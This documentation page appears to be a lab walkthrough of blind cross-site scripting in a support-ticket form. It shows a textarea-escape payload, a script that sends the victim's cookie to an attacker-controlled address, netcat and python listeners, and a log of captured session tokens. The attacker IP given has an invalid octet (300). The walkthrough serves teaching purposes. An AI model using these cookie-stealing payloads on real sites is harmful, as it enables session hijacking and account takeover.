---
sidebar_position: 3
title: Blind XSS 
---

:::info Scenario

Website with a Vulnerable Support Tickets Tab.

:::

<br/>

- **Tickets Tab**

```sql
┌─────────────────────┐  ┌─────────────────────┐
| Ticket Subject:     |  | Ticket Contents:    |
|─────────────────────|  |─────────────────────|
| Text Goes Here..    |  | Text Goes Here..    |
└─────────────────────┘  └─────────────────────┘
```


<br/>

- Creating a Support Ticket with the **Subject: Test XSS | Contents: Random..**
	- Viewing the Page Source, we can see the **Contents** gets placed inside a `Textarea Tag`

```html
<div class="panel panel-default" style="margin:25px">
	<div class="panel-heading">Ticket Information</div>
		<div class="panel-body">
		<div><label>Status:</label> Open</div>
		<div><label>Ticket Id:</label> 3</div>
		<div><label>Ticket Subject:</label> Test XSS</div>
		<div><label>Ticket Created:</label> 12/02/2022 02:59</div>
		<div><label>Ticket Contents:</label></div>
		<div><textarea class="form-control">Random..</textarea></div>
	</div>
</div>
```

<br/>

- Escaping the **Textarea Tag:**
	- Opening the Ticket and viewing the Page Source, we've successfully escaped the `Textarea Tag`
	- **PAYLOAD:** `</textarea>Test XSS`

```html
<div...
	<div...
		<div><textarea class="form-control"></textarea>Test XSS</textarea></div>
	</div>
</div>
```

<br/>

- **XSS:**
	- Now when we view the Ticket, we get an Alert Box with the string XSS
	-  **PAYLOAD:** `</textarea><script>alert('XSS');</script>`

```html
<div...
	<div...
		<div><textarea class="form-control"></textarea><script>alert('XSS');</script></textarea></div>
	</div>
</div>
```

<br/>

- Intercepting Staff Member `Cookies`:
	-  To do this, our PAYLOAD will need to Extract the User's Cookie and exfiltrate it to another Web Server. 

-  **PAYLOAD:** 

```html
</textarea><script>var i=new Image;i.src='http://10.20.50.300:8000/?'+document.cookie;</script>
```


- We can Intercept the Response using `python3 -m http.server 8000` or `nc -nvlp 8000`

```html
<div...
	<div...
		<div><textarea class="form-control"></textarea><script>var i=new Image;i.src='http://10.20.50.300:8000/?'+document.cookie;</script></textarea></div>
	</div>
</div>
```

<br/>

- **When a Staff Member Clicks the Ticket we get hes Account Cookies**

```py
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.11.40  - - "GET /?staff-session=4AB305E55955187693F01D6F8FD2D321 HTTP/1.1" 200 -
10.20.50.300 - - "GET /?session=7dba956f2747f74a1f11784dc318433fb HTTP/1.1" 200 -
```